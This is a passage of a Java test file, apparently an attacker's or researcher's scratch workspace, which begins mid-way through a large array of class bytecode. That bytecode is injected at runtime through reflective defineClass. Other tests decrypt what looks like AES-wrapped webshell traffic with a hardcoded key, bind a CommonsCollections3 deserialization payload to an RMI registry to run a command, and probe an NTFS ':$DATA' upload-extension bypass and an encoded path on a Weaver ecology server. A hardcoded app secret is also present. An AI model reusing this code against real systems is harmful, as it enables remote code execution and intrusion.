,114,1,0,5,99,108,101,97,114,1,0,19,40,41,76,106,97,118,97,47,110,105,111,47,66,117,102,102,101,114,59,1,0,9,97,118,97,105,108,97,98,108,101,1,0,6,97,112,112,101,110,100,1,0,45,40,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,41,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,66,117,105,108,100,101,114,59,1,0,3,112,117,116,1,0,25,40,91,66,41,76,106,97,118,97,47,110,105,111,47,66,121,116,101,66,117,102,102,101,114,59,1,0,4,102,108,105,112,1,0,12,104,97,115,82,101,109,97,105,110,105,110,103,1,0,27,40,67,41,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,66,117,102,102,101,114,59,1,0,44,40,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,41,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,66,117,102,102,101,114,59,1,0,8,103,101,116,66,121,116,101,115,1,0,11,116,111,85,112,112,101,114,67,97,115,101,1,0,7,103,101,116,72,111,115,116,1,0,20,103,101,116,78,101,116,119,111,114,107,73,110,116,101,114,102,97,99,101,115,1,0,21,106,97,118,97,47,117,116,105,108,47,69,110,117,109,101,114,97,116,105,111,110,1,0,15,104,97,115,77,111,114,101,69,108,101,109,101,110,116,115,1,0,11,110,101,120,116,69,108,101,109,101,110,116,1,0,16,103,101,116,73,110,101,116,65,100,100,114,101,115,115,101,115,1,0,14,103,101,116,72,111,115,116,65,100,100,114,101,115,115,0,33,0,121,0,122,0,0,0,2,0,2,0,123,0,124,0,0,0,2,0,125,0,126,0,0,0,6,0,1,0,127,0,-128,0,1,0,-127,0,0,0,17,0,1,0,1,0,0,0,5,42,-73,0,1,-79,0,0,0,0,0,1,0,-126,0,-125,0,1,0,-127,0,0,5,-60,0,5,0,40,0,0,5,112,43,-64,0,2,-64,0,2,77,44,3,50,-64,0,3,78,44,4,50,-64,0,4,58,4,42,44,5,50,-64,0,5,-64,0,5,-75,0,6,42,44,6,50,-64,0,7,-64,0,7,-75,0,8,44,7,50,-64,0,9,-74,0,10,54,5,44,8,50,-64,0,9,-74,0,10,54,6,44,16,6,50,-64,0,9,-74,0,10,54,7,44,16,7,50,-64,0,11,58,8,44,16,8,50,-64,0,11,58,9,44,16,9,50,-64,0,11,58,10,44,16,10,50,-64,0,11,58,11,44,16,11,50,-64,0,11,58,12,44,16,12,50,-64,0,11,58,13,44,16,13,50,-64,0,11,58,14,44,16,14,50,-64,0,11,58,15,44,16,15,50,-64,0,11,58,16,44,16,16,50,-64,0,11,58,17,44,16,17,50,-64,0,11,58,18,44,16,18,50,-64,0,11,58,19,44,16,19,50,-64,0,11,58,20,44,16,20,50,-64,0,11,58,21,44,16,21,50,-64,0,11,58,22,44,16,22,50,-64,0,11,58,23,44,16,23,50,-64,0,11,58,24,44,16,24,50,-64,0,11,58,25,44,16,25,50,-64,0,11,58,26,45,-71,0,12,1,0,-71,0,13,1,0,58,27,25,4,-71,0,14,1,0,58,28,45,25,12,-71,0,15,2,0,58,29,25,29,-58,1,-25,-69,0,11,89,42,25,29,-74,0,16,-73,0,17,58,29,42,25,29,-74,0,18,-102,1,-49,25,4,-71,0,19,1,0,45,-71,0,20,1,0,58,30,-69,0,21,89,25,29,-73,0,22,58,31,25,31,-74,0,23,-64,0,24,58,32,25,32,25,30,-74,0,25,25,32,4,-74,0,26,45,-71,0,27,1,0,58,33,25,33,-72,0,28,58,34,25,34,-72,0,29,25,34,-71,0,30,1,0,58,35,25,35,-71,0,31,1,0,-103,0,50,25,35,-71,0,32,1,0,-64,0,11,58,36,25,36,25,12,-74,0,33,-102,0,25,45,25,36,-71,0,15,2,0,58,37,25,32,25,36,-72,0,34,25,37,-74,0,35,-89,-1,-54,17,4,0,-68,8,58,36,45,-71,0,36,1,0,2,-97,0,73,25,32,-74,0,37,58,37,-89,0,18,58,38,25,4,25,9,25,26,-71,0,39,3,0,3,-84,45,-71,0,40,1,0,58,38,25,38,25,36,-74,0,41,89,54,35,2,-97,0,16,25,37,25,36,3,21,35,-74,0,42,-89,-1,-24,25,37,-74,0,43,25,37,-74,0,44,25,32,-74,0,45,-71,0,46,1,0,-71,0,47,1,0,58,37,25,37,-71,0,31,1,0,-103,0,63,25,37,-71,0,32,1,0,-64,0,11,58,38,25,38,-58,0,43,25,38,18,48,-74,0,33,-102,0,33,25,38,18,49,-74,0,33,-102,0,23,25,32,25,38,-74,0,50,58,39,25,4,25,38,25,39,-71,0,39,3,0,-89,-1,-67,25,32,-74,0,51,17,1,-112,-94,0,13,25,32,-74,0,52,58,37,-89,0,26,25,32,-74,0,53,58,37,25,37,-57,0,14,25,4,21,5,-71,0,54,2,0,3,-84,-69,0,55,89,-73,0,56,58,38,25,37,25,36,-74,0,57,89,54,35,2,-97,0,30,21,35,-68,8,58,39,25,36,3,25,39,3,21,35,-72,0,58,25,38,25,39,-74,0,59,-89,-1,-38,-69,0,11,89,25,38,-74,0,60,-73,0,17,58,39,25,4,18,48,25,39,-74,0,61,-72,0,62,-71,0,63,3,0,25,4,25,32,-74,0,51,-71,0,54,2,0,25,28,25,39,-74,0,64,25,28,-74,0,65,3,-84,25,4,-71,0,66,1,0,25,4,21,5,-71,0,54,2,0,45,25,10,-71,0,15,2,0,58,30,25,30,-58,2,64,25,30,3,16,22,-74,0,67,58,31,25,30,16,22,-74,0,68,58,30,25,4,25,8,25,17,-71,0,39,3,0,25,30,25,19,-74,0,69,-102,0,125,-69,0,11,89,42,45,25,11,-71,0,15,2,0,-74,0,16,-73,0,17,18,70,-74,0,71,58,32,25,32,3,50,58,33,25,32,4,50,-72,0,72,54,34,-72,0,73,58,35,25,35,-69,0,74,89,25,33,21,34,-73,0,75,-74,0,76,87,25,35,3,-74,0,77,87,25,27,25,31,25,35,-71,0,78,3,0,25,4,25,8,25,17,-71,0,39,3,0,-89,1,-74,58,32,25,4,25,9,25,16,-71,0,39,3,0,25,4,25,8,25,13,-71,0,39,3,0,-89,1,-101,25,30,25,20,-74,0,69,-102,0,42,25,27,25,31,-71,0,79,2,0,-64,0,80,58,32,25,32,-74,0,81,-74,0,82,-89,0,5,58,33,25,27,25,31,-71,0,83,2,0,-89,1,106,25,30,25,21,-74,0,69,-102,0,-103,25,27,25,31,-71,0,79,2,0,-64,0,80,58,32,21,6,-72,0,84,58,33,25,32,25,33,-74,0,85,54,34,21,7,54,35,3,54,36,21,34,-98,0,81,21,34,-68,8,58,37,25,33,-74,0,86,3,25,37,3,21,34,-72,0,58,25,28,42,25,37,-74,0,87,-74,0,64,25,28,-74,0,65,25,33,-74,0,88,87,21,36,21,34,96,54,36,21,34,21,6,-95,0,25,21,36,21,35,-95,0,6,-89,0,15,25,32,25,33,-74,0,85,54,34,-89,-1,-80,25,4,25,8,25,17,-71,0,39,3,0,-89,0,16,58,33,25,4,25,8,25,13,-71,0,39,3,0,-89,0,-54,25,30,25,22,-74,0,69,-102,0,-64,25,27,25,31,-71,0,79,2,0,-64,0,80,58,32,18,89,58,33,45,-71,0,40,1,0,58,34,25,34,-74,0,90,54,35,21,35,2,-96,0,6,-89,0,55,21,35,-68,8,58,36,25,34,25,36,-74,0,57,2,-96,0,6,-89,0,35,-69,0,91,89,-73,0,92,25,33,-74,0,93,-69,0,11,89,25,36,-73,0,17,-74,0,93,-74,0,94,58,33,-89,-1,-65,42,25,33,-74,0,16,58,35,25,35,-66,-72,0,84,58,36,25,36,25,35,-74,0,95,87,25,36,-74,0,96,87,25,36,-74,0,97,-103,0,14,25,32,25,36,-74,0,98,87,-89,-1,-16,25,4,25,8,25,17,-71,0,39,3,0,-89,0,35,58,33,25,4,25,9,25,25,-71,0,39,3,0,25,4,25,8,25,13,-71,0,39,3,0,25,32,-74,0,81,-74,0,82,-89,0,10,25,28,25,14,-74,0,64,-89,0,4,77,3,-84,0,9,1,-45,1,-38,1,-35,0,38,3,78,3,-86,3,-83,0,38,3,-32,3,-24,3,-21,0,38,4,17,4,-122,4,-119,0,38,4,-79,5,61,5,64,0,38,0,0,1,-21,5,109,0,38,1,-20,2,-101,5,109,0,38,2,-100,3,6,5,109,0,38,3,7,5,106,5,109,0,38,0,0,0,1,0,-124,0,-123,0,1,0,-127,0,0,1,22,0,5,0,8,0,0,1,10,-69,0,99,89,-73,0,100,77,43,-66,62,3,54,4,21,4,29,-94,0,-12,43,21,4,-124,4,1,51,17,0,-1,126,54,5,21,4,29,-96,0,43,44,42,-76,0,6,21,5,5,124,52,-74,0,101,87,44,42,-76,0,6,21,5,6,126,7,120,52,-74,0,101,87,44,18,102,-74,0,103,87,-89,0,-71,43,21,4,-124,4,1,51,17,0,-1,126,54,6,21,4,29,-96,0,69,44,42,-76,0,6,21,5,5,124,52,-74,0,101,87,44,42,-76,0,6,21,5,6,126,7,120,21,6,17,0,-16,126,7,124,-128,52,-74,0,101,87,44,42,-76,0,6,21,6,16,15,126,5,120,52,-74,0,101,87,44,18,104,-74,0,103,87,-89,0,100,43,21,4,-124,4,1,51,17,0,-1,126,54,7,44,42,-76,0,6,21,5,5,124,52,-74,0,101,87,44,42,-76,0,6,21,5,6,126,7,120,21,6,17,0,-16,126,7,124,-128,52,-74,0,101,87,44,42,-76,0,6,21,6,16,15,126,5,120,21,7,17,0,-64,126,16,6,124,-128,52,-74,0,101,87,44,42,-76,0,6,21,7,16,63,126,52,-74,0,101,87,-89,-1,12,44,-74,0,105,-80,0,0,0,0,0,1,0,-122,0,-121,0,1,0,-127,0,0,1,18,0,4,0,10,0,0,1,6,43,-74,0,106,77,44,-66,62,-69,0,55,89,29,-73,0,107,58,4,3,54,5,21,5,29,-94,0,-24,42,-76,0,8,44,21,5,-124,5,1,51,51,54,6,21,5,29,-94,0,9,21,6,2,-97,-1,-23,21,6,2,-96,0,6,-89,0,-59,42,-76,0,8,44,21,5,-124,5,1,51,51,54,7,21,5,29,-94,0,9,21,7,2,-97,-1,-23,21,7,2,-96,0,6,-89,0,-94,25,4,21,6,5,120,21,7,16,48,126,7,124,-128,-74,0,108,44,21,5,-124,5,1,51,54,8,21,8,16,61,-96,0,9,25,4,-74,0,60,-80,42,-76,0,8,21,8,51,54,8,21,5,29,-94,0,9,21,8,2,-97,-1,-40,21,8,2,-96,0,6,-89,0,93,25,4,21,7,16,15,126,7,120,21,8,16,60,126,5,124,-128,-74,0,108,44,21,5,-124,5,1,51,54,9,21,9,16,61,-96,0,9,25,4,-74,0,60,-80,42,-76,0,8,21,9,51,54,9,21,5,29,-94,0,9,21,9,2,-97,-1,-40,21,9,2,-96,0,6,-89,0,21,25,4,21,8,6,126,16,6,120,21,9,-128,-74,0,108,-89,-1,24,25,4,-74,0,60,-80,0,0,0,0,0,8,0,-120,0,-119,0,2,0,-127,0,0,0,115,0,4,0,6,0,0,0,103,18,89,76,42,18,109,-74,0,71,77,44,-66,62,3,54,4,21,4,29,-94,0,72,44,21,4,50,58,5,-69,0,91,89,-73,0,92,43,-74,0,93,25,5,3,4,-74,0,67,-74,0,110,-74,0,93,25,5,4,-74,0,68,-74,0,93,-74,0,94,76,-69,0,91,89,-73,0,92,43,-74,0,93,18,109,-74,0,93,-74,0,94,76,-124,4,1,-89,-1,-72,43,3,43,-74,0,61,4,100,-74,0,67,-80,0,0,0,0,0,-118,0,0,0,4,0,1,0,38,0,0,0,-117,0,-116,0,2,0,-127,0,0,0,107,0,3,0,7,0,0,0,95,-69,0,21,89,43,-73,0,22,-74,0,111,77,-72,0,112,78,45,-71,0,113,1,0,-103,0,71,45,-71,0,114,1,0,-64,0,115,58,4,25,4,-74,0,116,58,5,25,5,-71,0,113,1,0,-103,0,40,25,5,-71,0,114,1,0,-64,0,117,58,6,25,6,-63,0,118,-103,0,17,25,6,-74,0,119,44,-74,0,120,-103,0,5,4,-84,-89,-1,-44,-89,-1,-74,3,-84,0,0,0,0,0,-118,0,0,0,4,0,1,0,38,0,0};
        Method method = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
        method.setAccessible(true);
        Object ret = method.invoke(this.getClass().getClassLoader(), clazzBytes, 0, clazzBytes.length);
        System.out.println(((Class)ret).getConstructor().newInstance().toString());

        // 将字节码写入到文件
        String path = "D:\\tmp\\test.class";
        FileOutputStream out = new FileOutputStream(new File(path));
        out.write(clazzBytes);
        out.flush();
        out.close();


        // 生成base64后的字节码
//        String encode = Base64.encode(b);
//        System.out.println(encode);
    }


    @Test void testBase64decoded()throws Exception{
        String decoded = aesDecode("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","6721cdbf6f3f49aa");
        System.out.println(decoded);
    }


    private String aesDecode(String encText,String key) {
        try {
            byte[] keyBytes = key.getBytes("utf-8");
            Key aesKey = new SecretKeySpec(keyBytes,"AES");
            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            IvParameterSpec iv = new IvParameterSpec(keyBytes);
            cipher.init(Cipher.DECRYPT_MODE, aesKey,iv);
            byte[] result = cipher.doFinal(base64DecodeToByte(encText));
            return new String(result);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    public byte[] base64DecodeToByte(String base64Text) {
        String javaVersion = System.getProperty("java.version");
        try {
            Class clazz;
            byte[] outBytes;
            if (javaVersion.compareTo("1.9") >= 0) {
                clazz = Class.forName("java.util.Base64");
                Object encoderObj = clazz.getMethod("getDecoder").invoke((Object)null);
                outBytes = (byte[]) encoderObj.getClass().getMethod("decode", String.class).invoke(encoderObj, base64Text);
            } else {
                clazz = Class.forName("sun.misc.BASE64Decoder");
                outBytes = (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), base64Text);
            }
            return outBytes;
        } catch (Exception var6) {
            return new byte[0];
        }
    }

    private String aesEncode(String var1) {
        try {
            byte[] var2 = "ba62bec394134718".getBytes("utf-8");
            SecretKeySpec var3 = new SecretKeySpec(var2, "AES");
            Cipher var4 = Cipher.getInstance("AES/CBC/PKCS5Padding");
            IvParameterSpec var5 = new IvParameterSpec(var2);
            var4.init(1, var3, var5);
            byte[] var6 = var4.doFinal(var1.getBytes("utf-8"));
            String var7 = this.base64Encode(var6);
            String var8 = this.base64Encode(var2);
            return var8 + var7;
        } catch (Exception var9) {
            throw new RuntimeException(var9);
        }
    }

    private String base64Encode(byte[] var1) throws Exception {
        String var2 = System.getProperty("java.version");
        Class var3;
        Object var4;
        String var5;
        if (var2.compareTo("1.9") >= 0) {
            var3 = Class.forName("java.util.Base64");
            var4 = var3.getMethod("getEncoder").invoke(var3);
            var5 = (String)var4.getClass().getMethod("encodeToString", byte[].class).invoke(var4, var1);
        } else {
            var3 = Class.forName("sun.misc.BASE64Encoder");
            var4 = var3.getDeclaredConstructor().newInstance();
            var5 = (String)var4.getClass().getMethod("encode", byte[].class).invoke(var4, var1);
        }
        return var5;
    }


    @Test
    public void testCtf()throws Exception{
        Registry registry = LocateRegistry.getRegistry("192.168.192.152", 1099);
        Object cmd = Proxy.newProxyInstance(Remote.class.getClassLoader(), new Class[]{Remote.class}, (InvocationHandler) CC3.getPayload("calc"));
        Remote remote = Remote.class.cast(cmd);
        registry.bind("hackYou", remote);
    }

    public void repalceKeyStr(String str)throws Exception{
        Class aClass = str.getClass();
        try {
            Field value= aClass.getDeclaredField("value");
            //设置私有成员变量可访问
            value.setAccessible(true);
            char[] o1 = (char[])value.get(str);
            //利用o1修改地址所指向的char数组
            o1[1] = '3';
            System.out.println("[+] updated String: "+str);
        } catch (NoSuchFieldException | IllegalAccessException e) {
            e.printStackTrace();
        }
    }

    @Test
    public  void testChangeStr()throws Exception{
        String test = "127.0.0.1";
        repalceKeyStr(test);
        System.out.println(test);
    }


    @Test
    public void testScript()throws Exception{
        ScriptEngine engine = new ScriptEngineManager().getEngineByName("javascript");
        String test666="print(2+2)";
        engine.eval(test666);
    }


    @Test
    public void testDyRun()throws Exception{

        try {
            Field f = Unsafe.class.getDeclaredField("theUnsafe");
            f.setAccessible(true);
            Unsafe unsafe = (Unsafe) f.get(null);
            Object obj = unsafe.allocateInstance(EXPObject.class);
            System.out.println(obj);
        } catch (Exception e) {
            e.printStackTrace();
        }



    }


    @Test
    public void testClassLoader()throws Exception{
        try {
            try {
                Field f = Unsafe.class.getDeclaredField("theUnsafe");
                f.setAccessible(true);
                Unsafe unsafe = (Unsafe) f.get(null);



            } catch (Exception e) {
                e.printStackTrace();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }




    @Test
    public void testJianhang()throws Exception{
        String jsonString="{\"appId\":\"5f30bb4e55fb4000071383c2\",\"salt\":\"5QtWk0GlIUgjHeCDZDIMPb6Qj1EhKOf3\",\"timestamp\":1638521858}";
        String appSecret="7jiDYGlOuSb62quFoRIj94NMWSeOO3Zh";

        String data = DigestUtil.sha1Hex(jsonString);
        String key = DigestUtil.sha1Hex(appSecret);
        key = key.substring(0, 16);

        //构建
        SymmetricCrypto aes =new SymmetricCrypto(SymmetricAlgorithm.AES, key.getBytes());

        //加密为16进制表示
        String encryptHex = aes.encryptHex(appSecret);

        System.out.println(encryptHex);

    }

    public static boolean isNotNullAndNotBlank(String... var0) {
        if (var0 != null && var0.length > 0) {
            String[] var1 = var0;
            int var2 = var0.length;

            for(int var3 = 0; var3 < var2; ++var3) {
                String var4 = var1[var3];
                if (var4 == null || var4.trim().isEmpty()) {
                    return false;
                }
            }

            return true;
        } else {
            return false;
        }
    }

    public static String getSuffix(String var0, String var1) {
        String var2 = "";
        if (isNotNullAndNotBlank(var0, var1)) {
            String[] var3 = var0.split(var1);
            int var4 = var3.length;
            if (var4 > 1) {
                var2 = var3[var4 - 1];
            }
        }

        return var2;
    }

    public static String getFileExt(String var0) {
        return getSuffix(var0, "\\.");
    }

    @Test
    public void testSuffix()throws Exception{
        String test = "fuck.jsp:.zip:$DATA";
        String fileExt = getFileExt(test);
        System.out.println(fileExt);
    }

    @Test
    public void testFileEnc()throws Exception{
        String path = "H:\\WEAVER\\ecology\\filesystem\\weboffice\\fuck%2ehtml";
        File file = new File(path);
        if(file.exists()){
            System.out.println("hack");
        }else{
            System.out.println("dumy...........");
        }


    }







































}
